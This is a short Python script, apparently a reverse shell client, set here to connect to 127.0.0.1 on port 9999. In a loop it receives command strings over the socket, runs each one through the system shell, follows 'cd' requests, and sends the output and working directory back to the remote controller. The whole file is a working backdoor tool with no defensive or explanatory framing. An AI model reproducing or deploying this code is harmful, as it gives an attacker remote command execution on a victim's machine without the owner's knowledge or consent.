import socket
import os
import subprocess

s = socket.socket()
host = "127.0.0.1"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        outputByte = cmd.stdout.read() + cmd.stderr.read()
        outputString = str(outputByte, 'utf-8')

        currWorkingDir = os.getcwd() + "> "
        s.send(str.encode(outputString + currWorkingDir))

        print(outputString)


